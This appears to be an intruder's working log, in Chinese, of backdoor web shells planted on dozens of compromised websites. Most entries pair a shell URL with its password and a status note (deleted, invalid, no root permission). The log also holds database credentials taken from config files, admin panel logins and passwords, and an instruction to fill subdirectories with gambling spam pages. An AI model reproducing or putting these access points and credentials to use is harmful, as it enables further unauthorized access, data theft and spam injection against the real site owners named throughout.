+http://www.bjhgyh.com/web_config/admin.config.php
+
+3   码子无效
+http://www.njwanteng.com/admin/about_admin.php
+http://www.njwanteng.com/aspnet_client/system_web/2_0_50727/index.php
+http://www.njwanteng.com/mobile/admin/Html/Include/decode.php
+http://www.njwanteng.com/admin/copyright.php
+
+4
+http://7a.yixuedh.com/templates/Argon/assets/scss/custom/mixins/form_config.php
+http://7a.yixuedh.com/templates/default/img/images_config.php
+http://7a.yixuedh.com/modules/server/index.php
+
+5链接已重置
+http://www.crliving.cn/include/inc/int_fun_admin.php
+http://www.crliving.cn/include/qrcode/phpqradmin.php
+http://www.crliving.cn/install/module_autos/changyan_autologin.php
+
+6码子无效
+http://www.l-baby.net/datuqiehuan/2017-08-03/list_admin.php
+http://www.l-baby.net/banquanxinxi/video.php
+http://www.l-baby.net/news/pinpaixinxi/2017-09-08/index.php
+http://www.l-baby.net/datuqiehuan/2017-09-11/197.php
+
+7码被删
+http://www.jinghualm.com/include/helpers/file.register.php
+http://www.jinghualm.com/install/module_autos/changyan_autologin.php
+http://www.jinghualm.com/uploads/190521/2-1Z521131210946.php
+
+8被删
+http://www.zgrczpw.com/plus/task/dede_admin.php
+http://www.zgrczpw.com/install/config.mem.inc.php
+http://www.zgrczpw.com/install/module_autos/changyan_autolog.php
+
+
+http://www.medkaoyan.net/med_kaoyan/login.php
+9
+http://www.deyijia168.com/inc/admin_base.all.php
+http://www.deyijia168.com/images/fs/tupian/fushang_sanjiao.php
+http://www.deyijia168.com/images/fs/tupian/fushang_sanjiao.php
+http://www.deyijia168.com/inc/admin_all_inc.php
+http://www.deyijia168.com/template/admin/common/page.php
+
+10
+http://www.17qidian.com/new/index.php
+http://www.17qidian.com/search/keyword/admin_config.php
+http://www.17qidian.com/gonggao/index.admin.php
+http://www.17qidian.com/e/admin-vp/PostCenter/inc_config.php
+
+11qs无效
+http://www.bqzsgs.com/inc/admin_config.php
+http://www.bqzsgs.com/template/admin/common/page.php
+http://www.bqzsgs.com/inc/admin.ini.php
+
+
+http://www.chineseshadow.com/image/index/_notes/_notes/menuimage0.gif.jsp    1
+
+12被删除
+http://www.psprint.com.tw/member/qrcode.php
+http://www.psprint.com.tw/member/admin_config.php
+http://www.psprint.com.tw/news/userlogin.php
+
+
+13qs无效
+http://www.henansps.com/include/ckeditor/skins/kama/images/dialog_sides.php
+http://www.henansps.com/include/calendar/image.config.php
+http://www.henansps.com/install/admin.config.php
+
+
+14
+http://www.slminfo.com/LeanMfg/plugin/uploadify/upload.inc.php
+http://www.slminfo.com/include/admin_config.php
+http://www.slminfo.com/install/admin_inc.php
+
+15qs无效
+http://www.bsyjzzs.com/inc/admin.ini.php
+http://www.bsyjzzs.com/template/admin/common/page.php
+http://www.bsyjzzs.com/Eleditor/layout/base.php
+
+16qs无效
+http://shuijun.work/templets/default/style/table.css.php
+http://shuijun.work/style/js/tab_lib.php
+http://shuijun.work/member/uploads.ini.fun.php
+
+17
+http://sunsso.com/data/cache/admin.config.php
+http://sunsso.com/include/helpers/admin_inc_config.php
+http://sunsso.com/member/ajax_userback.php
+
+
+18
+http://www.zjbml.com/usr/home/qxu2060310050/htdocs/de888/admin_config.php
+http://www.zjbml.com/install/admin.php
+http://www.zjbml.com/templets/demo/index_header.php
+http://www.zjbml.com/include/payment/pay_code.php
+
+
+19
+http://www.chengdejili.com/include/helpers/admin_config.php
+http://www.chengdejili.com/install/common.admin.php
+http://www.chengdejili.com/install/templates/image.step.php
+
+20
+http://www.associazioneomnibus.com/wp-includes/SimplePie/Decode/HTML/index.php
+http://www.associazioneomnibus.com/wp-includes/rest-api/class-wp-rest-login.php
+http://www.associazioneomnibus.com/wp-includes/SimplePie/Decode/index.php
+
+
+21
+http://admin.slmy10000.com/uploads/20190423/admin.php
+http://admin.slmy10000.com/admin/index_admin.php
+http://admin.slmy10000.com/static/admin/static/h-ui.admin/index.php
+
+
+22已删除
+http://www.zcj001.com/uploads/170826/1-1FR610214c92.php
+http://www.zcj001.com/install/install.lock.php
+http://www.zcj001.com/install/module_autos/changyan_autolog.php
+
+23
+http://www.llqqxx.cc/socket/admin.config.php
+http://www.llqqxx.cc/Application/Admin/logic.admin.php
+http://www.llqqxx.cc/Application/Admin/Common/user.ini.php
+
+24
+qs无效
+http://www.jncfjy.com/include/qrcode/qrcode_alipay.php
+http://www.jncfjy.com/data/enums/vocation.php
+http://www.jncfjy.com/uploads/allimg/160323/kechenggsl.php
+
+25被删除
+http://www.qianduanshe.com/statics/plugin/index.php
+http://www.qianduanshe.com/statics/plugin/loveit/img/ba_images.php
+http://www.qianduanshe.com/uploadfile/2018/0424/images.inc.php
+
+26无根目录权限
+http://49yj.com/attachment/mutiupload/index_inc.php
+http://49yj.com/attachment/upload/71/6671.php
+http://49yj.com/attachment/upload/middle/index_inc.php
+
+27被删除
+http://www.farstake.com/uploads/userup/index.inc.php
+http://www.farstake.com/include/ckeditor/plugins/ajax/plugin.inc.php
+http://www.farstake.com/include/ckeditor/plugins/templates/templates/images/images.inc.php
+
+
+28
+http://www.yizhushop.com/images/swfupload/plugins/swfupload.admin.php
+http://www.yizhushop.com/templets/default/images/mood/ico-mood-inc.php
+http://www.yizhushop.com/install/module_autos/changyan_autolog.php
+
+29、
+http://liat.cn/include\admin.php
+\dede\templets\dede_config.php
+dede\dede_admin.php
+dede\templets\admin_dede.asp
+install\install.config.asp
+
+30
+http://www.huiminreli.com/order/alipay/class/admin.asp
+http://www.huiminreli.com/inc\inc.admin.asp
+http://www.huiminreli.com/templates\huimin\wap\about.asp
+http://www.huiminreli.com/upload\news\month_1903\image_config.asp
+http://www.huiminreli.com/upload\news\asp.php
+
+31链接已重置
+http://dmsview.com/exit.asp  c0nn fc218
+http://dmsview.com/Template\exit.inc.asp
+http://dmsview.com/news\search\de_admin.asp
+http://dmsview.com/Module\about_admin.asp
+
+32
+http://www.botrum.cn/ph/inc/aspcms_admin.asp
+http://www.botrum.cn/inc\main\aspcms.asp
+http://www.botrum.cn/admin\_system\aspcms_admin.asp
+
+33
+http://www.pcwlwl.com/uploads\index.asp
+http://www.pcwlwl.com/install\templates\aspcms_admin.asp
+http://www.pcwlwl.com/templets\default\style\aspcms_admin.asp
+
+34
+http://www.sh-swantrade.com/Inc\conn.config.asp
+http://www.sh-swantrade.com/aspnet_client\system_web\4_0_30319\aspcms.asp
+http://www.sh-swantrade.com/aspnet_client\system_web\asp_admin.asp
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+1204
+1
+http://f3bhopal.org/fonts/fans.php  fans
+http://f3bhopal.org/fonts/function.php
+http://f3bhopal.org/Uploads/190003/Ambulance/images.php
+http://f3bhopal.org/web/DatePicker/bootstrap/index.php
+
+
+2已删除
+http://www.zhongguo77.com/css/basics.asp  ceshi
+http://www.zhongguo77.com/inc/abc.asp
+http://www.zhongguo77.com/templates/default/command.asp
+http://www.zhongguo77.com/Include/admin_config.asp
+
+3无根目录权限
+http://www.ceramicfibers.cn/data/vote/vote_1.asp  c0nn
+http://www.ceramicfibers.cn/data\vote\function.asp
+http://www.ceramicfibers.cn/data\index.html.asp
+http://www.ceramicfibers.cn/data\install\js1.asp
+
+
+4被删除
+ http://www.hnyzgd.com/Upfile/2012310/2012031038199421.asp  c0nn
+ http://www.hnyzgd.com/Upfile/2012310/config.user.asp
+ http://www.hnyzgd.com/Inc\cmd.function.asp
+ http://www.hnyzgd.com/Editor\index.asp
+Editor\xheditor\skins\default\iframe.asp
+Editor\xheditor\skins\default.asp
+
+http://www.hnyzgd.com/Upfile/2012310/2012031038199421.asp
+http://www.hnyzgd.com/Upfile/2012310\fuction.asp
+
+
+5
+已删除
+http://www.zhenyu.net/china/zhu.files/_vti_cnf/banner4s.asp  ceshizhan
+http://www.zhenyu.net/china/zhu.files/_vti_cnf/admin.asp
+http://www.zhixincpa.com/images/_notes/banner.swf.asp  
+
+6
+http://foshan-sunrise.com/uploadfile/products/oday.asp  11088
+http://foshan-sunrise.com/uploadfile/products/user.asp
+http://foshan-sunrise.com/uploadfile/products/admin.asp
+http://foshan-sunrise.com/include/configs.asp          c0nn
+http://foshan-sunrise.com/include\FileUpload\list_member.asp
+下的所有二级目录做：秒速飞艇新1230
+
+7被删，新网暂停页
+http://www.hoingu.com/upload/images/2015/4/2294711741.asp  jianjian
+http://www.hoingu.com\upload\images\2015\4\2294711742.asp
+include\index.asp
+http://www.hoingu.com\js\js.asp   chifan
+http://www.hoingu.com\js\jquery.js.asp
+http://www.hoingu.com/upload/images/2015/4/image.asp
+http://www.hoingu.com/upload/index.asp
+http://www.hoingu.com/Template\admin_user.asp删除
+http://www.hoingu.com/Template\Content\t_content.asp删除
+http://www.hoingu.com/SiteServer\Themes\Language\user_config.asp删除
+http://www.hoingu.com\SiteServer\Themes\lauguage.asp删除
+
+8
+http://www.lysika.com/upfile/mb/oday.asp  11088  已删除
+http://www.lysika.com/uploadfile\image_config.asp
+http://www.lysika.com/m\header.asp
+http://www.lysika.com/seo2019\inc_admin.asp
+uploadfile\image_config.asp
+
+9被删除
+http://www.jiangsuyujie.com/UpLoadPic/Pro_Pic/201912120562516348.asp  adminzcbp
+http://www.jiangsuyujie.com/\user.config.asp
+http://www.jiangsuyujie.com/Public\user.config.asp
+http://www.jiangsuyujie.com/manage\checkmember.asp
+
+
+
+
+
+
+<?php
+//数据库连接信息
+$cfg_dbhost = 'localhost';
+$cfg_dbname = 'www0731jzxcom';
+$cfg_dbuser = 'root';
+$cfg_dbpwd = 'wuhu@888';
+$cfg_dbprefix = 'hp168_';
+$cfg_db_language = 'gbk';
+
+
+?>
+
+
+http://www.scbazhuayu.com/guahao/default.php|x
+http://www.scbazhuayu.com/templets/list_index.php
+后台：
+http://www.scbazhuayu.com/xiehe_jzx/login.php?gotopage=%2Finclude%2Fdialog%2Fselect_soft.php%3Fgotopage%3D%25252Finclude%25252Fdialog%25252Fselect_soft.php%25253Factivepath%25253D%25252Fst0pst0pst0pst0pst0pst0pst0pst0p%26adminDirHand%3Dxiehe_jzx%26sbt%3D%25E8%25BD%25AC%25E5%2585%25A5%25E7%2599%25BB%25E5%25BD%2595
+shengda
+admin
+http://0731jzx.com/install\sql-admin.php
+http://0731jzx.com/jzxjj/ysbj/list_cfg.php|x
+http://0731jzx.com/uploads/flink/703.php
+0731jzx.com/templets/index.php
+后台：http://0731jzx.com/xian_jzx/
+lirongsheng	
+密码：admin521520
+
+hzjkjs
+
+$cfg_dbhost = 'localhost';
+$cfg_dbname = 'www0731jzxcom';
+$cfg_dbuser = 'root';
+$cfg_dbpwd = 'wuhu@888';
+$cfg_dbprefix = 'hp168_';
+$cfg_db_language = 'gbk';
+
+1、防火墙
+http://www.scbazhuayu.com/guahao/mohomb/index.php 被删
+http://www.scbazhuayu.com/data/sessions_f53ed7772b/tet.php  a 被删
+http://www.scbazhuayu.com/jzxjj/jzxjjwh/list_index.php
+   http://www.scbazhuayu.com/data/admin/config_admin.php
+   http://www.scbazhuayu.com/data/enums/frametype.php
+   http://www.scbazhuayu.com/install/config.inc.user.php
+   http://www.scbazhuayu.com/include/arc.caicai.admin.php
+2、http://chaoji.hebqingxi.com/upload/20191202/999c86e469e453e322c772ae5a4d6e73.php admin
+http://chaoji.hebqingxi.com/themes/simpleboot3_new/manifest.php
+http://chaoji.hebqingxi.com/themes/admin_simpleboot3/admin/index.login.php
+http://chaoji.hebqingxi.com/static/install/simpleboot/admin_login.php
+http://chaoji.hebqingxi.com/static/install/images/image.php
+
+3、http://13.8-888.vip/1980.php  123qwe
+http://13.8-888.vip/admin_config.php
+http://13.8-888.vip/static/config/config.php
+http://13.8-888.vip/Scripts/javascript.php
+http://13.8-888.vip/upload/goods/20176303_config.php
+
+
+4、http://yidongpo.hjhuanbao.com/zhchjhuan/inc/inc_archives_funfdd.php  abc123
+http://yidongpo.hjhuanbao.com/zhchjhuan/inc/inc_admin_info.php
+http://yidongpo.hjhuanbao.com/include/arc.aichives.class.php
+http://yidongpo.hjhuanbao.com/include/inc/inc_fun_user.php
+
+
+5、http://www.eptribe.cn/uploads/xx.php  xxy   已删除
+https://www.eptribe.cn/uploads/index.php
+http://www.eptribe.cn/include/downloaduser.php
+http://www.eptribe.cn/include/ckeditor/ckeditor_admin.php
+http://www.eptribe.cn/include/ckeditor/adapters/jquery_1.1.0.js.php
+
+6、http://gxgcy.net/editor/editor/filemanager/browser/default/connectors/php/configda.php  dama
+http://gxgcy.net/editor/editor/filemanager/browser/default/connectors/php/connector_user.php
+http://gxgcy.net/editor/editor/filemanager/browser/default/connectors/php/ioconfig.php
+http://gxgcy.net/setup/checkins.php
+http://gxgcy.net/html/index.php
+http://gxgcy.net/inc/models/admin_config.php已删除
+
+http://wl036cl.cn/Uploads/link/2019-12-15/5df5bd916b3cb.php
+
+
+
+7、被删除 
+http://www.zhiqidazhi.com/plus/guestbook/images/botright.php  data
+http://www.zhiqidazhi.com/plus/guestbook/guestbook.config.php
+http://www.zhiqidazhi.com/plus/guestbook/edit_inc_admin.php
+http://www.zhiqidazhi.com/include/Lurd.class.admin.php
+http://www.zhiqidazhi.com/include/tpllib/plus_user.php
+http://www.zhiqidazhi.com/include/taglib/username.lib.php
+
+8、
+http://www.wayprinter.com/include/helpers/cacsde.helper.php  abc123
+http://www.wayprinter.com/include/helpers/cache.user.php
+http://www.wayprinter.com/include/payment/command.php
+http://www.wayprinter.com/include/ckeditor/themes/default/theme.php
+http://www.wayprinter.com/install/module_autos/changyan_autolog.php
+
+9、
+http://gzfasco.com/wp-admin/includes/class-bulk-qehlte-upgrader-skin.php  abc123
+http://gzfasco.com/wp-admin/includes/file.user.php
+http://gzfasco.com/wp-admin/includes/admin_config.php
+
+
+Yuan., [04.12.19 22:13]
+http://www.medkaoyan.net/med_kaoyan/login.php
+
+Yuan., [04.12.19 22:13]
+hus07331 yanda519
+http://www.medkaoyan.net/uploads/151209/index.php                  1231+
+
+10、被删除
+http://www.angelukstudy.com/application/Install/Lang/zh-en.php  fc2019
+http://www.angelukstudy.com/application/Install/Lang/zh_ch.php
+http://www.angelukstudy.com/application/Install/Common/command.php
+http://www.angelukstudy.com/application/Install/Controller/UserController.class.php
+http://www.angelukstudy.com/application/Admin/Controller/UserController.class.php删除
+http://www.angelukstudy.com/admin/themes/simplebootx/Admin/Main/login.php删除
+http://www.angelukstudy.com/admin/themes/simplebootx/Admin/Setting/page_config.php删除
+
+11、
+http://www.fomitai.com/template/default_en/images/pr_bottom.php  baidu88585..!@
+http://www.fomitai.com/template/default_en/images/index_bottom.php
+http://www.fomitai.com/includes-/library.php
+http://www.fomitai.com/member/member.user.php
+
+12、被删除http://lnlssjy.com/uploadfile/20191202190514891489.doc/.php  admin
+http://lnlssjy.com/uploadfile/message.config.php
+http://lnlssjy.com/function/admin.memeber.php
+http://lnlssjy.com/config/guanggao/duilian.php
+
+13、http://www.yec100.org/admin/css/common1.php  heiyan   无根目录权限
+http://www.yec100.org/admin/css/tab.php
+http://www.yec100.org/admin/login.php
+http://www.yec100.org/admin/manage.php
+
+ourphp
+http://www.ylhled.com/templates/default/cn/cn_photo2.php
+http://www.ylhled.com/templates/default/en/en_articleclub.php
+http://www.ylhled.com/templates/default/cn/cn_down.php|y
+http://www.ylhled.com/templates/default.php|x
+http://www.ylhled.com/templates/default/en/en_top.php
+http://www.ylhled.com/function/ourphp_user.php
+http://www.ylhled.com/config/ourphp_conf.php
+
+
+
+14http://youmebiotechidn.com/core/Check33.php  6HchtWAiaX
+http://youmebiotechidn.com/apps/admin/model/system/index——admin.php  6HchtWAiaX
+http://youmebiotechidn.com/apps/admin/model/system/configadmin.php
+http://youmebiotechidn.com/static/upload/image_config.php
+http://youmebiotechidn.com/static/backup/upgrade/index_admin.php
+http://youmebiotechidn.com/template/moban/font/HELP-US-OUT.php
+
+
+http://mpstarcn.com/templates/default/cn/cn_photo1.php
+$ourphp_webpath="/"; 
+$ourphp_validation="12345"; 
+$ourphp_adminpath="client/manage"; 
+$ourphp_mysqlurl="localhost"; 
+$ourphp_mysqlname="mpstarcn"; 
+$ourphp_mysqlpass="mingpu888"; 
+$ourphp_mysqldb="mpstarcn"; 
+
+
+15、
+http://www.kskldz.com/templets/default/index_head.php
+http://www.kskldz.com/templets\plus\guest_footer.php
+无效http://www.kskldz.com/uploads/allimg/190530/footer_tpl.php  admin
+http://kskldz.com/uploads/allimg/190530/header_tpl.php
+http://kskldz.com/include/unzip.class.php
+http://kskldz.com/install/tablestyle.php
+http://kskldz.com/install/module_autos/chuangyan_auto.php
+http://kskldz.com/member/visit-admin.php
+http://kskldz.com/install/module_autos/autoregedit.php
+http://kskldz.com/install/tablestyle.php
+
+
+16、无效
+http://www.aizhentou.cn/include/helpers/extend.helperz.php  dama404
+http://www.aizhentou.cn/include/helpers/archive.header.php
+http://www.aizhentou.cn/include/arc.archives_class.php
+http://www.aizhentou.cn/include/dialog/admin_config.php
+http://www.aizhentou.cn/install/config.admin.inc.php
+
+17 无效
+http://www.sjzsfdjd.com/m/assets/fonts/fontawesome-web.php
+http://www.sjzsfdjd.com/m/assets/fonts/fontaweome-webfont.php  dama
+http://www.sjzsfdjd.com/include/json_user.php
+http://www.sjzsfdjd.com/uploads/allimg/190408/1-1Z40Q3240Y18.php
+http://www.sjzsfdjd.com/include/ckeditor/config.php
+
+18、
+http://www.gcchongkongwang.com/templets/plus/carbuyactions.php  heiyan
+http://www.gcchongkongwang.com/include/inc/inc_config.php
+http://www.gcchongkongwang.com/include/dialog/select_admins.php
+http://www.gcchongkongwang.com/include/dedeuser.inc.php|x
+http://www.gcchongkongwang.com/plus/tele_number.php
+[userid] => admin
+[pwd] => 4579faf07eb4c0e42011
+<?php
+//数据库连接信息
+$cfg_dbhost = '127.0.0.1';
+$cfg_dbname = 'vljlrfvz_ccc';
+$cfg_dbuser = 'vljlrfvz_ccc';
+$cfg_dbpwd = 'rNL7R5mEDN';
+$cfg_dbprefix = 'dede_';
+$cfg_db_language = 'utf8';
+
+http://www.gcchongkongwang.com/templets/plus/rssmap.php
+http://www.gcchongkongwang.com/include/usermanager.class.php
+http://www.gcchongkongwang.com/include/helpers/extend.filter.php
+http://www.gcchongkongwang.com/templets/dirlist.php
+
+
+
+
+
+http://www.ahdycl.org.cn/media/css/normalize.php  bian.o
+
+http://www.jintingwang.com/include/dama.php  3460972316
+http://www.cyzhi.com/data/enums/guestbokg.php  abc123
+http://www.jingtaoweb.com/4.php  baidu
+http://www.njxcdz.cn/1.php  heiyan
+http://www.idocs.cn/UploadFiles/hsdm.php  888678
+http://www.chenmo.com.cn/wp-content/plugins/wp-super-cache/plugins/headerbg.php  abc123
+http://www.dyhdrz.com/LightBox/images/lii.php  admin
+http://dghymold.com/upfile/201912/2019120275373185.gif/.php  admin
+http://www.dyhdrz.com/uploadfiles/20191202205401358.gif/.php  admin
+
+http://www.casatiatextile.com/Upjpeg/hsdm.php  888678
+
+http://www.beidefeng.com/Count/mdb/lii.php  admin
+http://www.jlxlcd.cn/kindeditor/themes/default/111.php  2901
+http://dyssy.cn/lightbox/images/lii.php  admin
+http://www.sdhcjs.com/count/images/lii.php  admin
+http://www.dyhaichuan.cn/lii.php  admin
+http://www.qingyanshe.com.cn/static/images/headicon.php/index.php  dama
+http://www.lzhdsjc.com/sy.php  dapeng
+
+http://www.sdzsjy.net/Count/Images/lii.php  admin
+http://www.ksdesd.com/404.php  da
+
+
+http://www.tzjd888.com/manage/eWebEditorv8/uploadfile/20191202/20191202191014725.gif/.php  admin
+http://www.lipin52.com/plus/xx.php  xx
+http://www.njlew.net/uploadfile/20191202175807551.gif/.php  admin
+http://www.nmhongxinqiye.com/Upload/0.jpg/0.php  dapeng
+http://www.hldpump.com/include/helpers/cacsde.helper.php  abc123
+http://faka001.wvv.pw/php.php  admin
+http://www.gybyzz.com/upLoad/news/month_1912/201912021716006630.gif/.php  admin
+http://www.0546fxb.com/uploadfiles/20191202171202593.gif/.php  admin
+http://syaijiu.com/userfiles/image/??/ligejpg1.jpg/.php  admin
+http://hihjl.cn/jm.php  54772453        404
+
+
+http://www.675nk.cn/upload/files/notifys.php  xcker8       404
